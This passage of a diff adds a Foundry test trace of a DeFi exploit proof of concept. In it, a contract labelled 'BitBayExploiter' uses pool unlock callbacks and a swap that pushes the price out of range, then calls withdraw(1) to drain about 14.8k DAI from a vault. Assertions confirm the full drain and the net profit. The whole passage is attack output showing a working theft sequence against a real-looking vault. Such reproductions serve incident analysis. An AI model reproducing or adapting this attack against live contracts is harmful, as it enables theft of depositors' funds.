+    │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 37095378 [3.709e7]
+    │   │   │   │   └─ ← [Return] 37095378 [3.709e7]
+    │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 30298359671420803629 [3.029e19]
+    │   │   │   │   └─ ← [Return] 30298359671420803629 [3.029e19]
+    │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [staticcall]
+    │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0xDD15B203dAFF25C9d1Cc53E524e85aB20ae0A70c) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 37095378 [3.709e7]
+    │   │   │   │   └─ ← [Return] 37095378 [3.709e7]
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 3: 0x000000000000000000000000000000000000000000000000002bdd338e1a901d → 0x000000000000000000000000000000000000000000000000002d19a2162a28b6
+    │   │   │   │   @ 4: 13490 → 13822
+    │   │   │   │   @ 5: 0x0000000000000000000000000000000000000000000000015cd52776784ee0fb → 0x000000000000000000000000000000000000000000000001a4796597f40eda2d
+    │   │   │   │   @ 6: 0x0000000000000000000000000000000000000000000000000000000001eab743 → 0x00000000000000000000000000000000000000000000000000000000023607d2
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000000032459afda1bfb97c00c → 0x00000000000000000000000000000000000000000000032459afda1bfb97c00b
+    │   │   │   │   @ 0xd5ce871ae9021201bef81f6d37c125fcdeccbd336ebd825239acea6f95005c69: 1 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [13704] 0x67366782805870060151383F4BbFF9daB53e5cD6::unlock(0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   ├─ [11745] 0x048E88311ca84876aeA086125825492e2AF2e5A0::unlockCallback(0x000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000010000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f)
+    │   │   │   │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   │   └─ ← [Return] 14838466608989135865711 [1.483e22]
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 14838466608989135865711 [1.483e22])
+    │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 14838466608989135865711 [1.483e22]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x048E88311ca84876aeA086125825492e2AF2e5A0, to: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 14838466608989135865711 [1.483e22])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x000000000000000000000000000000000000000000000073bc395dc79bcfb163 → 0x0000000000000000000000000000000000000000000003982150a917005a38d2
+    │   │   │   │   │   │   │   @ 0x7132d8df175a4c9f9cd4430f8e40f3fb90cba8eb144bf6376ed27ab250788cde: 0x00000000000000000000000000000000000000000000032465174b4f648a876f → 0
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Withdrawn(param0: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param1: 1, param2: 14838466608989135865711 [1.483e22], param3: 0)
+    │   │   │   │   └─ ← [Return] 0x
+    │   │   │   └─ ← [Return] 0x
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x815159e9921130cecaf28ce15344659cf61fa068782f6d37c043ea22c01cdf3c: 1 → 0
+    │   │   │   @ 16: 0x00000000000000000000000000000000000000000000032459afda1bfb97c00c → 0x00000000000000000000000000000000000000000000032459afda1bfb97c00b
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 16973405152330431215826 [1.697e22]
+    │   └─ ← [Return] 16973405152330431215826 [1.697e22]
+    ├─ [3679] 0x048E88311ca84876aeA086125825492e2AF2e5A0::getBalances() [staticcall]
+    │   ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [staticcall]
+    │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x048E88311ca84876aeA086125825492e2AF2e5A0) [delegatecall]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0, 0
+    ├─ emit log_named_decimal_uint(key: "DAI drained by withdraw(1)", val: 14838466608989135865711 [1.483e22], decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "vault DAI after withdraw", val: 0, decimals: 18)
+    ├─ [64692] BitBayExploiter::unwind()
+    │   ├─ [63148] 0x67366782805870060151383F4BbFF9daB53e5cD6::unlock(0x)
+    │   │   ├─ [61201] BitBayExploiter::unlockCallback(0x)
+    │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 107843364597 [1.078e11]
+    │   │   │   │   └─ ← [Return] 107843364597 [1.078e11]
+    │   │   │   ├─ [34662] 0x67366782805870060151383F4BbFF9daB53e5cD6::swap(PoolKey({ currency0: 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359, currency1: 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, fee: 50, tickSpacing: 1, hooks: 0x0000000000000000000000000000000000000000 }), SwapParams({ zeroForOne: true, amountSpecified: -107843364597 [-1.078e11], sqrtPriceLimitX96: 4295128740 [4.295e9] }), 0x)
+    │   │   │   │   ├─  emit topic 0: 0x40e9cecb9f5f1f1c5b9c97dec2917b7ee92e57ba5563708daca94dd84ad7112f
+    │   │   │   │   │        topic 1: 0x6da799cefb9ea6ceb8e45b37585c4cd7844b3aec34aa999c266beff925af1829
+    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   │   │           data: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffe6e408d90b0000000000000000000000000000000000000000000016d69fad4c3e55a870f300000000000000000000000000000000000f426b20511e02bfafa1f6a91b6cf1000000000000000000000000000000000000000000000113b6a242101c066d5a0000000000000000000000000000000000000000000000000000000000043764000000000000000000000000000000000000000000000000000000000000003f
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f3: 0x00000000000000000000000000000000000000000000000305b17f1138d9ffd7 → 0x000000000000000000000000000000000000000000000113b6a242101c066d5a
+    │   │   │   │   │   @ 0x5a2f712289301a0d2f302f429ca757c29f9fbcf9394f0fdb08b1354081926846: 0x000000000000000000000000000000000000008bda92032f7adf12a502080ad3 → 0x000000000000000000000000000000000000002de9d96738e7846f66a3a21bb8
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f1: 0x00000000000000000000000000000000000000b9c46a0226274ae6b9374665b5 → 0x00000000000000000000000000000000000000b9c46b7e67b4218f25e571aa83
+    │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd093: 0x000000000000000000000000000000000000008bdd12048480488deebfe9f707 → 0x000000000000000000000000000000000000002de758b1c1d0318619a77fd42b
+    │   │   │   │   │   @ 0x337b5bb0f3cad8438abdf61831c1e7f041ff2ebe7f7fd111d47c12aaa2dcd094: 0x0000000000000000000000000000009377d642f1c9db16090a86e62237358bc9 → 0x00000000000000000000000000044443fafaad6a942730120ef7be7e1a84d5f9
+    │   │   │   │   │   @ 0x5a2f712289301a0d2f302f429ca757c29f9fbcf9394f0fdb08b1354081926847: 0x00000000000000000000000000000091310989643830f135ae5081472422f733 → 0x0000000000000000000000000004444641c766f825d154e56b2e23592d976a8f
+    │   │   │   │   │   @ 0x755e5e2aaf47d86dc3018a814beae43b2e035e6645ccb5d3e99b3e63a58735f0: 0x00000000003200d00d04376600000000000f42d4ae7fe13d0906b59e23265a78 → 0x00000000003200d00d04376400000000000f426b20511e02bfafa1f6a91b6cf1
+    │   │   │   │   │   @ 0x772b0dc4c88533cd0599b033b7f17612ce355d04c95149a72b3bc4c0f18370d6: 0x000000000000000000000000000000000000000000000000000000000e9ee3a6 → 0x000000000000000000000000000000000000000000000000000000000eb44810
+    │   │   │   │   └─ ← [Return] -36697195361784898988681671037404753237084351205133 [-3.669e49]
+    │   │   │   ├─ [2623] 0x67366782805870060151383F4BbFF9daB53e5cD6::sync(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359)
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 2430992395580 [2.43e12]
+    │   │   │   │   │   └─ ← [Return] 2430992395580 [2.43e12]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [5363] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 107843364597 [1.078e11])
+    │   │   │   │   ├─ [4663] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::transfer(0x67366782805870060151383F4BbFF9daB53e5cD6, 107843364597 [1.078e11]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x67366782805870060151383F4BbFF9daB53e5cD6, value: 107843364597 [1.078e11])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xe90d223b8475c9f5790ad50dcb63db4fa1daef5714db9dc3ca7133fdc5fd7cee: 0x0000000000000000000000000000000000000000000000000000023602702d3c → 0x0000000000000000000000000000000000000000000000000000024f1e675431
+    │   │   │   │   │   │   @ 0xd5a3747ee31d3fd63e41cb739b082a09bdc30756b64987e2144484efdf2892c3: 0x000000000000000000000000000000000000000000000000000000191bf726f5 → 0
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [3224] 0x67366782805870060151383F4BbFF9daB53e5cD6::settle()
+    │   │   │   │   ├─ [1250] 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [staticcall]
+    │   │   │   │   │   ├─ [553] 0x235AE97b28466Db30469b89A9fe4cFf0659f82Cb::balanceOf(0x67366782805870060151383F4BbFF9daB53e5cD6) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 2538835760177 [2.538e12]
+    │   │   │   │   │   └─ ← [Return] 2538835760177 [2.538e12]
+    │   │   │   │   └─ ← [Return] 107843364597 [1.078e11]
+    │   │   │   ├─ [6027] 0x67366782805870060151383F4BbFF9daB53e5cD6::take(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063, BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107851171791359649018099 [1.078e23])
+    │   │   │   │   ├─ [4454] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107851171791359649018099 [1.078e23])
+    │   │   │   │   │   ├─ [3594] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::transfer(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 107851171791359649018099 [1.078e23]) [delegatecall]
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x67366782805870060151383F4BbFF9daB53e5cD6, to: BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 107851171791359649018099 [1.078e23])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x3ed518f3076798ab3fa7765e94dc7204666d51e232c626475579e56f22c98605: 0x00000000000000000000000000000000000000000000bc0e7b5fc9f76bb34dd4 → 0x00000000000000000000000000000000000000000000a537dbb27db9160adce1
+    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000003982150a917005a38d2 → 0x000000000000000000000000000000000000000000001a6ec0fdf5555602a9c5
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return] 0x
+    │   │   └─ ← [Return] 0x
+    │   ├─  storage changes:
+    │   │   @ 3: 1 → 2
+    │   └─ ← [Stop]
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 124824576943690080233925 [1.248e23]
+    │   └─ ← [Return] 124824576943690080233925 [1.248e23]
+    ├─ emit log_named_decimal_uint(key: "Net DAI profit (final DAI - working capital)", val: 14824576943690080233925 [1.482e22], decimals: 18)
+    ├─ [0] VM::assertEq(true, true, "precondition: vault had live liquidity") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(276326 [2.763e5], 276325 [2.763e5], "push swap must move the tick to >= tickUpper (out of range)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0, "reposition must leave liquidity == 0") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0, "withdraw must drain the vault DAI to zero") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(14838466608989135865711 [1.483e22], 14000000000000000000000 [1.4e22], "withdraw(1) must drain the whole vault position (~14.8k DAI)") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertApproxEqRel(14824576943690080233925 [1.482e22], 14824576943690080233925 [1.482e22], 10000000000000000 [1e16], "net DAI profit must match the ~14.8k DAI vault drain") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2086] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::symbol() [staticcall]
+    │   ├─ [1226] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::symbol() [delegatecall]
+    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000034441490000000000000000000000000000000000000000000000000000000000
+    │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000034441490000000000000000000000000000000000000000000000000000000000
+    ├─ [1418] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [564] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::balanceOf(BitBayExploiter: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 124824576943690080233925 [1.248e23]
+    │   └─ ← [Return] 124824576943690080233925 [1.248e23]
+    ├─ [1254] 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063::decimals() [staticcall]
+    │   ├─ [406] 0x490e379C9cFF64944bE82b849F8FD5972C7999A7::decimals() [delegatecall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit DAI Balance", val: 124824576943690080233925 [1.248e23], decimals: 18)
+    ├─  storage changes:
+    │   @ 0x60f24c858ec6095a35d1ec44848772859e046260c65f35697f37fa2b06f1fa9e: 0 → 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11
+    │   @ 0x60f24c858ec6095a35d1ec44848772859e046260c65f35697f37fa2b06f1faa1: 0 → 1
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 617.44ms (36.04ms CPU time)
+
+Ran 1 test suite in 620.43ms (617.44ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
